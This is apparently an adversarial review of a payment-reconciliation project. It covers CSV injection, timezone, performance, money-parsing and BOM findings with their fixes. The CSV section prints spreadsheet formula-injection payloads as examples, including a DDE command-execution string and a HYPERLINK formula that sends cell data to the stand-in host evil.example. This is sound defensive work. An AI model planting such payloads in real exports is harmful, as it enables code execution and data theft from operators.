# Adversarial review

A hostile pass over the submission, run on 2026-09-01: not "does the benchmark
score well" but "what does this do when the input did not come from its own
generator, and what would a reviewer who is not on your side find in ten
minutes". Six findings, five fixed, one measured and left standing with its
cause named.

Every finding is reproduced by a test in `tests/test_adversarial.py`, which was
written **before** the fixes and failed on all six. That file is the finding
list; this document is why each one matters.

| # | finding | severity | status |
|---|---|---|---|
| 1 | CSV injection in the operator queue | **high** | fixed |
| 2 | Timezone offsets accepted, then silently dropped | **high** | fixed |
| 3 | Throughput collapses with batch size | **high** | two causes fixed; a third measured |
| 4 | Money parser accepts shapes it never decided to | medium | fixed |
| 5 | Excel's BOM reported as a missing column | low | fixed |
| 6 | Gate 8 re-solves a matching per candidate | — | **not fixed**; measured and named below |

---

## 1. CSV injection in the operator queue — high

`runs/<family>/exceptions.csv` is the artifact this project asks a human to
open, and finance operators open CSVs in Excel. Excel, LibreOffice and Sheets
all evaluate a cell beginning `=`, `+`, `-`, `@`, tab or carriage return as a
formula. Before the fix, three cells in a crafted queue row were live:

```
@SUM(1+9)*cmd|' /C calc'!A0
=1+1
=HYPERLINK("http://evil.example/?"&A1,"click")
```

`=HYPERLINK` exfiltrates whatever the sheet can see the moment somebody clicks
it. In this repository the evidence strings are generated, which is exactly why
it was easy to miss — in production that column carries bank narration and
gateway payment descriptions, which is **text a paying customer chooses**. That
is attacker-controlled input arriving in a finance team's spreadsheet through
the deliverable.

Fixed by prefixing a leading apostrophe on affected cells only. Stripping the
character would have been wrong: the operator still has to read the evidence and
match it against the ledger, so the cell has to survive intact. A test asserts
both halves — no live cell, and the text still readable — plus a third asserting
ordinary rows are written byte-identical, because a guard that rewrites the
99.9% is its own bug.

## 2. Timezone offsets accepted and then dropped — high

`datetime.fromisoformat` accepts `2026-06-05T23:30:00-08:00`. Every `.date()`
downstream then takes the calendar day **in the offset the string carried**, so
that timestamp — the 6th in UTC — was read as the 5th.

The recovery window is four days wide, and gate 3 measures against exactly this
field. A one-day shift can admit a candidate the window should have rejected, or
reject one it should have admitted, silently, on the field that decides where
money is attributed. Real feeds mix naive local stamps and `Z`-suffixed ones in
the same file, which is the realistic way this arrives.

Fixed by refusing an offset-bearing timestamp at the boundary. Normalising would
mean the parser choosing a timezone for the merchant, which is not a decision a
settlement-file parser gets to make — the same reasoning the existing units
guard already uses on amounts.

## 3. Throughput collapses with batch size — high

The reported figure came from 500-record batches. Measured across sizes, before
any fix:

| records | reconcile | records/sec |
|---:|---:|---:|
| 500 | 0.022 s | 47,926 |
| 2,000 | 0.230 s | 18,184 |
| 8,000 | 4.466 s | 3,737 |
| 20,000 | 31.939 s | 1,303 |

A 40× increase in size cost 1,450× the time — a 37× collapse in throughput. For
a payments company that is the difference between a figure and a claim.

Profiling found the cost was **not** in the nine-gate solver the design is proud
of. It was two whole-batch folds recomputed inside loops:

- `_verdict` rebuilt four whole-run indexes **once per case** — `O(cases × claims)`.
- `Batch.referenced_event_ids` (gate 1) was a plain property folding every detail
  line, asked **once per candidate**: 1,714 calls and 10.9 million iterations at
  8,000 records.

Both fixed — the first by building a `LadderIndex` once and passing it in (a
cache makes the repeated call cheap; passing it in makes it impossible), the
second by `cached_property` on a frozen, built-once-per-run value. After:

| records | reconcile | records/sec | vs before |
|---:|---:|---:|---:|
| 500 | 0.015 s | 67,183 | 1.4× |
| 2,000 | 0.069 s | 60,803 | 3.3× |
| 8,000 | 0.516 s | 32,356 | 8.7× |
| 20,000 | 2.756 s | 15,093 | **11.6×** |
| 50,000 | 19.840 s | 5,245 | — |

Every published accuracy figure is unchanged: D still 20.0% / 11.0% / 15.0%, the
same headroom, the same README table, byte-identical datasets.

The regression test asserts the **property**, not a wall-clock number: these
indexes are built a bounded number of times per run, not once per case. A timing
assertion would be flaky on a shared runner; this one fails only on the thing
that was actually wrong.

## 4. The money parser accepted shapes it never decided to — medium

`int()` is more generous than "integer paise". It takes PEP 515 underscores
(`1_000`), a leading plus, and decimal digits from any script (`١٢٣`).

**Stated precisely, because overstating it would be the same failure this
project warns about pointed the other way:** each of those converts to roughly
what it looks like, so this is a contract finding, not a demonstrated
hundredfold error. It matters because it is the money boundary, and because the
parser already refuses a decimal point on the explicit grounds that guessing
units is worse than stopping — the guard had holes that the same argument
covers. Fixed with `-?[0-9]+`.

Two things checked and deliberately **not** claimed as findings: a trailing
non-breaking space strips and parses correctly, and interior separators,
currency symbols and exponents were already refused. Both are recorded as
passing tests so a stricter parser cannot be credited with catching what was
never getting through.

## 5. Excel's BOM reported as a missing column — low

An operator who opens a CSV in Excel and saves it gets a UTF-8 BOM on the first
header cell. Read as plain `utf-8` the column became `﻿bank_row_id` and the
loader reported `missing column(s) bank_row_id` — sending somebody to look for a
schema problem that does not exist, over a file that is entirely fine. One word:
`utf-8-sig`. CRLF endings were already handled and now have a test saying so.

## 6. Gate 8 re-solves a bipartite matching per candidate — not fixed

After the two accidental quadratics were removed, the dominant cost is the
global-feasibility gate: `maximum_matching` and `augment`, 1,841 calls at 20,000
records, each rebuilding the adjacency graph. The scaling exponent still climbs
with size — roughly 1.1 between 500 and 2,000, and 2.15 between 20,000 and
50,000.

This one is **inherent to the design as written**, not an oversight: gate 8
decides feasibility by forcing each candidate pairing and re-solving the
residual assignment problem, which is what makes it a proof rather than a
ranking. Making it incremental — reusing the base matching across candidates —
is real work with real risk of changing results, and it is not something to
attempt days before a deadline on the one gate that underwrites the
false-match rate.

So it is reported rather than hidden: **the engine is comfortable to about
20,000 records per batch and degrades quadratically above that.** Settlement
batches are per-cycle, and a cycle of 20,000 payments is a substantial merchant,
so this is a real ceiling rather than an urgent one — but it is a ceiling, and a
reviewer should hear it from the submission rather than find it.

---

## What was attacked and found sound

Recorded because a review that only lists failures is not a review.

- **Rounding.** `round_half_up` is half-up in both directions at the exact `.5`
  boundary, including negatives. Not banker's rounding, which is the usual bug.
- **Float contamination.** No money value anywhere in a finished run is anything
  but `int` — checked across every detail line and every verdict exposure.
- **A payment line with non-positive gross** is already refused at load.
- **An empty batch** fails loudly (`gateway_ledger.csv contains no rows`) rather
  than reporting a clean reconciliation of nothing, which is the dangerous half
  of that failure.
- **A net-negative settlement cycle** — refunds exceeding payments, so the
  merchant is debited — is accepted and flagged as a control break rather than
  crashing or being silently absorbed.
